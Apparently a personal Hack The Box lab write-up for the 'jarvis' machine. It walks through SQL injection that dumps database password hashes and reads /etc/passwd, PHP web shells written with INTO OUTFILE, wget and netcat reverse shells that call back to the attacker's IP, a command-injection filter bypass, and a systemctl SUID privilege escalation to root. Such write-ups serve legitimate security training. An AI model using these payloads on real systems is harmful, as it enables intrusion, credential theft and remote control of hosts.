<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>jarvis</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#jarvis">jarvis</a></p>
<ol>
<li><a href="#nmapAutomator">nmapAutomator</a></li>
<li><a href="#gobuster">gobuster</a></li>
<li><a href="#initial foothold">initial foothold</a></li>
<ol>
<li><a href="#manual sqlinjection (Blind SQL injection)">manual sqlinjection (Blind SQL injection)</a></li>
<ol>
<li><a href="#Error based Blind SQL Injection">Error based Blind SQL Injection</a></li>
<li><a href="#revshell.php">revshell.php</a></li>
<li><a href="#Exploit the SQL injection to add php code into a file on the system">Exploit the SQL injection to add php code into a file on the system</a></li>
<li><a href="#reverse shell">reverse shell</a></li>
</ol>
<li><a href="#sqlmap">sqlmap</a></li>
<ol>
<li><a href="#sqlmap --os-shell">sqlmap --os-shell</a></li>
</ol>
</ol>
<li><a href="#privesc to pepper">privesc to pepper</a></li>
<ol>
<li><a href="#simpler.py">simpler.py</a></li>
<ol>
<li><a href="#ping method">ping method</a></li>
</ol>
<li><a href="#simpler.py privesc">simpler.py privesc</a></li>
</ol>
<li><a href="#privesc to root">privesc to root</a></li>
<ol>
<li><a href="#linEnum.sh">linEnum.sh</a></li>
<ol>
<li><a href="#SUID files">SUID files</a></li>
</ol>
<li><a href="#lse.sh">lse.sh</a></li>
<li><a href="#system.ctl GTFO">system.ctl GTFO</a></li>
<ol>
<li><a href="#Systemctl misconfigured permissions sudo/SUID">Systemctl misconfigured permissions sudo/SUID</a></li>
<li><a href="#root.service">root.service</a></li>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>jarvis</u></b></h1><img alt="images/1190-1.png" src="images/1190-1.png"/><br/><img alt="images/1190-2.png" src="images/1190-2.png"/></div>
</body></html><div class="page" id="jarvis"><h1><b><u>jarvis</u></b></h1><img alt="images/1190-1.png" src="images/1190-1.png"/><br/><img alt="images/1190-2.png" src="images/1190-2.png"/></div>
<div class="page" id="nmapAutomator"><h1><b><u>nmapAutomator</u></b></h1><img alt="images/1191-1.png" src="images/1191-1.png"/><br/><img alt="images/1191-2.png" src="images/1191-2.png"/><br/><img alt="images/1191-3.png" src="images/1191-3.png"/><br/><img alt="images/1191-4.png" src="images/1191-4.png"/><br/><br/><span style="color:#ffa500;">22/tcp </span><span style="color:#24ff00;">ssh<br/></span><span style="color:#ffa500;">80/tcp </span><span style="color:#24ff00;">http<br/></span><span style="color:#ffa500;">64999/tcp</span><span style="color:#24ff00;"> known server</span><br/><br/><img alt="images/1191-5.png" src="images/1191-5.png"/><br/><br/><br/><br/></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><img alt="images/1192-1.png" src="images/1192-1.png"/><br/></div>
<div class="page" id="initial foothold"><h1><b><u>initial foothold</u></b></h1><span style="color:#24ff00;">this is the front page of our victim webserver</span><br/><img alt="images/1194-1.png" src="images/1194-1.png"/><br/><br/><span style="color:#24ff00;">navigating through home, Rooms and Dining &amp; Bar we see <br/><br/>Rooms link redirects you to </span><img alt="images/1194-2.png" src="images/1194-2.png"/> and naviagting to a room <br/><br/>we see we have 6 types of rooms and clicking the “book now” button sets cod equal to the room number<br/><br/><img alt="images/1194-3.png" src="images/1194-3.png"/><br/><br/><br/><img alt="images/1194-4.png" src="images/1194-4.png"/> <img alt="images/1194-5.png" src="images/1194-5.png"/><br/><img alt="images/1194-6.png" src="images/1194-6.png"/><img alt="images/1194-7.png" src="images/1194-7.png"/><br/><br/><br/><span style="color:#24ff00;"> a simple way to find out how many columns this database has is to simply </span><span style="color:#ffff00;">increment</span><span style="color:#24ff00;"> the </span><span style="color:#ffa500;">cod value</span><span style="color:#24ff00;"> until nothing gets returned on the webpage</span><br/><img alt="images/1194-8.png" src="images/1194-8.png"/><br/><img alt="images/1194-9.png" src="images/1194-9.png"/><br/><span style="color:#24ff00;">now that we know there are only 6 entries in the database </span><br/></div>
<div class="page" id="manual sqlinjection (Blind SQL injection)"><h1><b><u>manual sqlinjection (Blind SQL injection)</u></b></h1><span style="color:#24ff00;">since we have reason to believe the webserver is talking to a mysql backend </span><span style="color:#ffff00;">(hotel reservation website with hotel rooms, prices etc)</span><span style="color:#24ff00;">, we can verify our suspicions through a variety of different</span><span style="color:#ffa500;"> Blind SQL injections</span><span style="color:#24ff00;"> and see how the webserver responds</span><br/><br/><br/><span style="color:#24ff00;">first ,we can check whether or not the </span><span style="color:#ffa500;">sql query</span><span style="color:#24ff00;"> has </span><span style="color:#ffff00;">valid imput sanitation/vallidation</span><span style="color:#24ff00;"> by adding a single quote </span><span style="color:#ffa500;">'</span><span style="color:#24ff00;"> to see if the sql query breaks<br/><br/>we know <br/></span><img alt="images/1193-1.png" src="images/1193-1.png"/><br/>returns the superior family room<br/><img alt="images/1193-2.png" src="images/1193-2.png"/><br/><br/>but if we were to add a single quote <span style="color:#ffa500;">'</span><br/><img alt="images/1193-3.png" src="images/1193-3.png"/><br/>ir breaks the internal <span style="color:#ffa500;">sql query</span><span style="color:#24ff00;">, meaning there is </span><span style="color:#ffff00;">NO input validation or sanitation</span><span style="color:#24ff00;"> (through single quote escapes)<br/></span><img alt="images/1193-4.png" src="images/1193-4.png"/><br/><br/><br/>for sql enumeration to be the most effective, it is crucial to find out how many columns the database is using for our <span style="color:#ffa500;">blind SQL injection</span><span style="color:#24ff00;">, because otherwise our injection will not output correctly if at all. Luckily enough a simple way to find out how many columns this database has is to simply </span><span style="color:#ffff00;">increment</span><span style="color:#24ff00;"> a </span><span style="color:#ffa500;">Union SELECT</span><span style="color:#24ff00;"> statement and see if the webpage spits out anything interesting from the backend database<br/><br/>to find out the exact number of colums, we'll keep adding column numbers to our mysql query until the database comes back with a non-error so<br/></span><span style="color:#ffa500;">union select 1<br/>union select 1,2<br/>union select 1,2,3<br/>union select 1,2,3,4<br/>union select 1,2,3,4,5<br/>union select 1,2,3,4,5,6</span><span style="color:#24ff00;"><br/>all show empty server responses<br/></span><img alt="images/1193-5.png" src="images/1193-5.png"/><br/><br/>BUT<br/><span style="color:#ffa500;">/room.php?cod=9999 union select 1,2,3,4,5,6,7</span><br/><img alt="images/1193-6.png" src="images/1193-6.png"/><br/><img alt="images/1193-7.png" src="images/1193-7.png"/><br/><span style="color:#ffff00;">bingo</span><span style="color:#24ff00;">! because the webserver is spitting out a bunch of random outputs that make no sense, we know our webserver has issued a valid mysql statement on the database as well as the fact that the database has</span><span style="color:#ffff00;"> 7</span><span style="color:#24ff00;"> columns <br/><br/>now comes the fun part!<br/></span></div>
<div class="page" id="Error based Blind SQL Injection"><h1><b><u>Error based Blind SQL Injection</u></b></h1><span style="color:#24ff00;">Error Based Database Enumeration</span><br/><br/><span style="color:#24ff00;">now that we know the correct number of database columns, we can substitute in a valid </span><span style="color:#ffa500;">mySQL</span><span style="color:#24ff00;"> query in one of the columns! take for example the simple query</span><br/><span style="color:#ffa500;">SELECT user FROM mysql.user</span><br/><span style="color:#24ff00;">subbing it makes our orginal union select statement look like this:</span><br/><span style="color:#ffa500;">http://10.10.10.143/room.php?cod=9999 union select 1,(SELECT user FROM mysql.user),3,4,5,6,7</span><br/><img alt="images/515-1.png" src="images/515-1.png"/><br/><img alt="images/515-2.png" src="images/515-2.png"/><br/><span style="color:#24ff00;">and we leaked DBadmin's username!</span><br/><span style="color:#ffff00;">user</span><span style="color:#24ff00;">=</span><span style="color:#ffff00;">DBadmin</span><br/><br/><br/><span style="color:#24ff00;">Great! we may even be able to leak the </span><span style="color:#ffff00;">password</span><span style="color:#24ff00;"> data as well from </span><span style="color:#ffa500;">mysql.user</span><span style="color:#24ff00;"> with the </span><br/><span style="color:#ffa500;">SELECT password FROM mysql.user</span><br/><span style="color:#24ff00;">subbing it in looks like the following:</span><br/><span style="color:#ffa500;">http://10.10.10.143/room.php?cod=9999 union select 1,(SELECT password FROM mysql.user),3,4,5,6,7</span><br/><img alt="images/515-3.png" src="images/515-3.png"/><br/><img alt="images/515-4.png" src="images/515-4.png"/><br/><span style="color:#24ff00;">and we leaked </span><span style="color:#ffff00;">DBadmin's </span><span style="color:#24ff00;">password hash!</span><br/><span style="color:#ffff00;">password</span><span style="color:#ffa500;">=</span><span style="color:#ffff00;">2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</span><br/><br/><br/><br/><span style="color:#24ff00;">we can also use the </span><span style="color:#ffa500;">group_concat() </span><span style="color:#24ff00;">mysql function to combine different database objects to one string, enumerating/outputting their contents all at once</span><br/><span style="color:#ffa500;">http://10.10.10.143/room.php?cod=9999 union select 1,(SELECT group_concat(host,user,password) FROM mysql.user),3,4,5,6,7</span><br/><img alt="images/515-5.png" src="images/515-5.png"/><br/><img alt="images/515-6.png" src="images/515-6.png"/><br/><br/><span style="color:#24ff00;">another mysql function we can play around with is the </span><span style="color:#ffa500;">LOAD_FILE(&lt;file location&gt;)</span><span style="color:#24ff00;"> function, which is practically like a local file inclusion vulnerability we've seen before, we can leak senstitive files from our victim this way! Lets try outputting /etc/passwd</span><br/><br/><span style="color:#ffa500;">http://10.10.10.143/room.php?cod=9999 union select 1,LOAD_FILE('/etc/passwd'),3,4,5,6,7</span><br/><img alt="images/515-7.png" src="images/515-7.png"/><br/><img alt="images/515-8.png" src="images/515-8.png"/><br/><br/><br/><br/><span style="color:#ffff00;">2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</span><span style="color:#24ff00;"> lets throw this hash in crackstation </span><br/><img alt="images/515-9.png" src="images/515-9.png"/><br/><span style="color:#24ff00;">and just like that, we've leaked </span><span style="color:#ffff00;">dbadmin's</span><span style="color:#24ff00;"> password </span><span style="color:#ffff00;">imissyou</span></div>
<div class="page" id="revshell.php"><h1><b><u>revshell.php</u></b></h1><span style="color:#24ff00;">mysql is capable of executing php code when our webbrowse can adequately navigate to the URL it is located with. Lets grab </span><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey's php reverse shell</a><span style="color:#24ff00;"> from our machine </span><br/><br/><img alt="images/1197-1.png" src="images/1197-1.png"/><br/><br/><span style="color:#24ff00;">and tweak its configuration to call back to attack machine </span><span style="color:#ffa500;">ip</span><span style="color:#24ff00;"> on the </span><span style="color:#ffa500;">port</span><span style="color:#24ff00;"> we desire</span><br/><img alt="images/1197-2.png" src="images/1197-2.png"/><br/><br/></div>
<div class="page" id="Exploit the SQL injection to add php code into a file on the system"><h1><b><u>Exploit the SQL injection to add php code into a file on the system</u></b></h1><span style="color:#24ff00;">Third, exploit the SQL injection to add php code into a file on the system. This involves two steps: (1) add php code that downloads the reverse shell script from the attack machine and saves it in a file on the target system, and (2) save the output of the query into a PHP file using the MYSQL INTO OUTFILE statement.</span><br/><br/><br/><span style="color:#ffa500;">9999 union select 1,(select '&lt;?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.62:5555/revshell.php\");?&gt;'),3,4,5,6,7 INTO OUTFILE '/var/www/html/test4.php'</span><strong><br/></strong><span style="color:#24ff00;">injecting php into the url string did not work as nicely for me as it did rana so I'm going to upload the php directly onto the server</span><br/><br/><br/><img alt="images/1196-1.png" src="images/1196-1.png"/><br/><strong>SELECT &lt;?php system($_GET['c']); ?&gt; into outfile “/var/www/html/sh3ll.php”</strong><br/><img alt="images/1196-2.png" src="images/1196-2.png"/><br/><br/><span style="color:#24ff00;">now if we navigate to </span><span style="color:#ffa500;">10.10.10.143/sh3ll.php?c=whoami</span><span style="color:#24ff00;"> we get<br/></span><img alt="images/1196-3.png" src="images/1196-3.png"/><br/><span style="color:#ff0000;">there's a way to upload this php system request through a direct sql injection as well but I haven't gotten it to work yet.<br/>http://10.10.10.143/room.php?cod=7 UNION SELECT 1, (</span><strong><span style="color:#ff0000;">SELECT '&lt;?php system($_GET["cmd"]); ?&gt;</span></strong><span style="color:#ff0000;">'),3,4,5,6,7 into outfile ‘/var/www/html/test6.php’</span><span style="color:#24ff00;"><br/>-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>NOTE: we can also inject this statement through nesting a </span><span style="color:#ffa500;">wget</span><span style="color:#24ff00;"> call within an </span><span style="color:#ffa500;">sql injection</span><span style="color:#24ff00;"> using the syntax discussed in the previous node, it would look like this:</span><br/><br/><span style="color:#ffa500;">http://10.10.10.143/room.php?cod=7 UNION SELECT1,(SELECT ‘&lt;?php exec(\"wget http://10.10.14.24/revshell.php -O /var/www/html/shell.php\"); ?&gt;'),3,4,5,6,7 into outfile '/var/www/html/test5.php'</span><br/><img alt="images/1196-4.png" src="images/1196-4.png"/><br/><img alt="images/1196-5.png" src="images/1196-5.png"/><br/><br/><img alt="images/1196-6.png" src="images/1196-6.png"/><br/><img alt="images/1196-7.png" src="images/1196-7.png"/><br/></div>
<div class="page" id="reverse shell"><h1><b><u>reverse shell</u></b></h1><span style="color:#24ff00;">taking the </span><span style="color:#ffff00;">netcat openbsd</span><span style="color:#24ff00;"> reverseshell from </span><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp">payloadallthethings</a><br/><img alt="images/1204-1.png" src="images/1204-1.png"/><br/><span style="color:#ffa500;">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.14.62 1337 &gt;/tmp/f</span><br/><br/><span style="color:#24ff00;">and urlencoding it with </span><span style="color:#ffa500;">ctrl+z </span><span style="color:#24ff00;">a</span><br/><br/><span style="color:#ffa500;">rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.62%201337%20%3E%2Ftmp%2Ff</span><br/><br/><span style="color:#24ff00;">when we send it through the shell script we've uploaded </span><br/><span style="color:#ffa500;">10.10.10.143.sh3ll.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.62%201337%20%3E%2Ftmp%2Ff</span><br/><img alt="images/1204-2.png" src="images/1204-2.png"/><br/><br/><span style="color:#24ff00;">we get a </span><span style="color:#ffff00;">shell</span><span style="color:#24ff00;">!</span><br/><img alt="images/1204-3.png" src="images/1204-3.png"/><br/><br/><span style="color:#24ff00;">this (url encoded) works too</span><br/><span style="color:#ffa500;">10.10.10.143.sh3ll.php?c=php -r '$sock=fsockopen("10.10.14.62",4242);$proc=proc_open("/bin/sh -i", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);'</span><br/><br/></div>
<div class="page" id="sqlmap"><h1><b><u>sqlmap</u></b></h1><span style="color:#24ff00;">first thing </span><span style="color:#ffa500;">sqlmap</span><span style="color:#24ff00;"> needs is the login get request packet, so fire up </span><span style="color:#ffa500;">burp suite</span><span style="color:#24ff00;"> and intercept this and save it to a text file </span><span style="color:#ffa500;">request.txt</span><br/><br/><img alt="images/1195-1.png" src="images/1195-1.png"/><br/><span style="color:#ffa500;">sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" -r request.txt</span><br/><br/><img alt="images/1195-2.png" src="images/1195-2.png"/><br/><span style="color:#24ff00;">user is</span> <span style="color:#ffff00;">DBadmin</span><br/><span style="color:#24ff00;">password is</span> <span style="color:#ffff00;">imissyou</span></div>
<div class="page" id="sqlmap --os-shell"><h1><b><u>sqlmap --os-shell</u></b></h1><span style="color:#ffa500;">sqlmap -v 4 --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" --os-shell -r request.txt</span><br/><br/><img alt="images/1198-1.png" src="images/1198-1.png"/><br/><br/><img alt="images/1198-2.png" src="images/1198-2.png"/><br/><br/><img alt="images/1198-3.png" src="images/1198-3.png"/><br/><span style="color:#ffa500;">nc -e /bin/sh 10.10.14.62 1234</span><br/><img alt="images/1198-4.png" src="images/1198-4.png"/><br/><br/><img alt="images/1198-5.png" src="images/1198-5.png"/><br/><br/></div>
<div class="page" id="privesc to pepper"><h1><b><u>privesc to pepper</u></b></h1><span style="color:#24ff00;">we see as </span><span style="color:#ffa500;">www-data</span><span style="color:#24ff00;"> we can run </span><span style="color:#ffa500;">simpler.py</span><span style="color:#24ff00;"> as pepper<br/><br/></span><img alt="images/1199-1.png" src="images/1199-1.png"/><br/><br/>looking at the file we see we have read permissions:<br/><img alt="images/1199-2.png" src="images/1199-2.png"/></div>
<div class="page" id="simpler.py"><h1><b><u>simpler.py</u></b></h1><span style="color:#24ff00;">we see </span><span style="color:#ffa500;">simpler.py</span><span style="color:#24ff00;"> is our avenue to privesc, and is a custom script that we'll have to look into for vulnerabilities</span><br/><img alt="images/1200-1.png" src="images/1200-1.png"/><br/><img alt="images/1200-2.png" src="images/1200-2.png"/><br/><br/><img alt="images/1200-3.png" src="images/1200-3.png"/><br/><img alt="images/1200-4.png" src="images/1200-4.png"/><br/><br/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="ping method"><h1><b><u>ping method</u></b></h1><img alt="images/1201-1.png" src="images/1201-1.png"/><br/><br/><span style="color:#24ff00;">we can use </span><span style="color:#ffa500;">sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</span><span style="color:#24ff00;"> as </span><span style="color:#ffff00;">pepper</span><br/><span style="color:#24ff00;">because of the direct user input the program plugs into os.system </span><img alt="images/1201-2.png" src="images/1201-2.png"/> a command without any input validation<img alt="images/1201-3.png" src="images/1201-3.png"/> , we should be able to <span style="color:#ffa500;">escape</span><span style="color:#24ff00;"> this method and spawn a shell by avoiding the forbidden characters</span> <span style="color:#ffa500;">&amp; ; - ' || </span><span style="color:#24ff00;">and</span><span style="color:#ffa500;"> |</span><br/><br/><br/><br/><br/></div>
<div class="page" id="simpler.py privesc"><h1><b><u>simpler.py privesc</u></b></h1><img alt="images/1202-1.png" src="images/1202-1.png"/><br/><span style="color:#ffa500;">$(/bin/bash)</span> <span style="color:#24ff00;">successfully avoids the forbidden characters in the program and spawn us a shell</span><br/><span style="color:#24ff00;">and we're </span><span style="color:#ffff00;">pepper</span><span style="color:#24ff00;">!<br/><br/>I had some problems with this pepper shell so I used</span><br/><span style="color:#ffa500;">nc -e /bin/bash 10.10.14.62 1235</span> <span style="color:#24ff00;">to call another reverse shell back to our attacking machine that had much better functionality</span></div>
<div class="page" id="privesc to root"><h1><b><u>privesc to root</u></b></h1></div>
<div class="page" id="linEnum.sh"><h1><b><u>linEnum.sh</u></b></h1><span style="color:#24ff00;">lets start our priv esc enum with </span><span style="color:#ffa500;">LinEnum.sh</span><br/><img alt="images/1205-1.png" src="images/1205-1.png"/><br/><br/><img alt="images/1205-2.png" src="images/1205-2.png"/><br/><br/><img alt="images/1205-3.png" src="images/1205-3.png"/><br/><br/><img alt="images/1205-4.png" src="images/1205-4.png"/><br/><br/><img alt="images/1205-5.png" src="images/1205-5.png"/><br/><br/><img alt="images/1205-6.png" src="images/1205-6.png"/><br/><span style="color:#ffa500;">-t </span><span style="color:#24ff00;">for thorough</span><br/><br/></div>
<div class="page" id="SUID files"><h1><b><u>SUID files</u></b></h1><img alt="images/1206-1.png" src="images/1206-1.png"/><br/><br/><span style="color:#ffa500;">systemctl</span><span style="color:#24ff00;"> known to be an uncommon SUID binary and is exploitable for privesc purposes</span><br/><img alt="images/1206-2.png" src="images/1206-2.png"/><br/><br/><br/><br/></div>
<div class="page" id="lse.sh"><h1><b><u>lse.sh</u></b></h1><span style="color:#24ff00;">gonna run</span><span style="color:#ffa500;"> lse.sh</span><span style="color:#24ff00;"> here for good measure since I love it</span> <br/>(upload it onto our victim the same we uploaded linenum)<br/><br/>It <span style="color:#24ff00;">Instantly shows us systemctl is an </span><span style="color:#ffff00;">uncommon setuid binary</span><span style="color:#24ff00;"> that is our primary attack vector</span><br/><img alt="images/516-1.png" src="images/516-1.png"/><br/><br/><span style="color:#24ff00;">we can potentially take advantage of some local cron files by </span><span style="color:#ffff00;">overwriting</span><span style="color:#ffa500;">/</span><span style="color:#ffff00;">hijacking</span><span style="color:#24ff00;"> some of the files they execute, but none of them run on a frequent basis, best to stick with systemctl here,</span><br/><img alt="images/516-2.png" src="images/516-2.png"/><br/><br/></div>
<div class="page" id="system.ctl GTFO"><h1><b><u>system.ctl GTFO</u></b></h1><span style="color:#24ff00;">googling</span><a href="https://gtfobins.github.io/gtfobins/systemctl/"> GTFO system.ctl </a><span style="color:#24ff00;">shows there are ways to escalate privileges with sudo privileges to </span><span style="color:#ffa500;">system.ctl</span><br/><br/><img alt="images/1207-1.png" src="images/1207-1.png"/><br/><br/></div>
<div class="page" id="Systemctl misconfigured permissions sudo/SUID"><h1><b><u>Systemctl misconfigured permissions sudo/SUID</u></b></h1><br/><img alt="images/1208-1.png" src="images/1208-1.png"/><br/><br/><br/><a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49">https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49</a><br/><img alt="images/1208-2.png" src="images/1208-2.png"/><br/><br/><img alt="images/1208-3.png" src="images/1208-3.png"/><br/><br/><span style="color:#ffa500;">bin/systemctl enable /home/~/root.service</span><br/><span style="color:#24ff00;">where </span><span style="color:#ffa500;">~</span><span style="color:#24ff00;"> is the directory of our compromised user </span><span style="color:#ffff00;">pepper</span></div>
<div class="page" id="root.service"><h1><b><u>root.service</u></b></h1><span style="color:#24ff00;">The plan is to write our own </span><span style="color:#ffa500;">root.service</span><span style="color:#24ff00;"> script that </span><span style="color:#ffa500;">systemctl</span><span style="color:#24ff00;"> will run as root when we start its service</span><br/><img alt="images/1209-1.png" src="images/1209-1.png"/><br/><br/><span style="color:#24ff00;">we'll use the bash reverse shell here from pentestmonkey to call a reverse shell back to our attack machine</span><br/><img alt="images/1209-2.png" src="images/1209-2.png"/><br/><br/><span style="color:#24ff00;">now we start the service with </span><span style="color:#ffa500;">systemctl</span><br/><img alt="images/1209-3.png" src="images/1209-3.png"/><br/><br/><span style="color:#24ff00;">and start it with our attack machine listening on the revshell's designated port and...</span><br/><img alt="images/1209-4.png" src="images/1209-4.png"/><br/><br/><span style="color:#24ff00;">we're </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span><br/><img alt="images/1209-5.png" src="images/1209-5.png"/><br/><br/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1210-1.png" src="images/1210-1.png"/><span style="color:#ffff00;"><br/>2afa36c4f05b37b34259c93551f5c44f<br/><br/></span><img alt="images/1210-2.png" src="images/1210-2.png"/><br/>d41d8cd98f00b204e9800998ecf84271</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1979-1.png" src="images/1979-1.png"/></div>
</div></body></html>